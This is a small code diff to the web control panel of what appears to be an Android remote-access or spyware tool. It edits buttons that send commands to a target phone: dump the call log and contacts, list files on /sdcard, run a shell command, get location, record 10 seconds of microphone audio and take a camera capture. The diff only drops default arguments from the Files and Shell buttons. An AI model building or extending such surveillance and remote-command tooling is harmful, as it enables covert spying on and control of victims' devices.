@@ -150,9 +150,9 @@ body{font-family:var(--font);background:var(--bg);color:var(--text);font-size:13
       <button onclick="sendQuickCommand('calls','list')" id="btn-calls">Call Log</button>
       <button onclick="sendQuickCommand('contacts','list')" id="btn-contacts">Contacts</button>
       <span class="sep"></span>
-      <button onclick="sendQuickCommand('files','list','{\"path\":\"/sdcard\",\"count\":\"100\"}')" id="btn-files">Files</button>
+      <button onclick="sendQuickCommand('files','list')" id="btn-files">Files</button>
       <span class="sep"></span>
-      <button onclick="sendQuickCommand('shell','exec','{\"cmd\":\"id\"}')" id="btn-shell">Shell (id)</button>
+      <button onclick="sendQuickCommand('shell','exec')" id="btn-shell">Shell (id)</button>
       <button onclick="sendQuickCommand('location','get')" id="btn-location">Location</button>
       <button onclick="sendQuickCommand('mic','record','{\"duration\":10}')" id="btn-mic">Mic 10s</button>
       <button onclick="sendQuickCommand('camera','capture')" id="btn-camera">Camera</button>
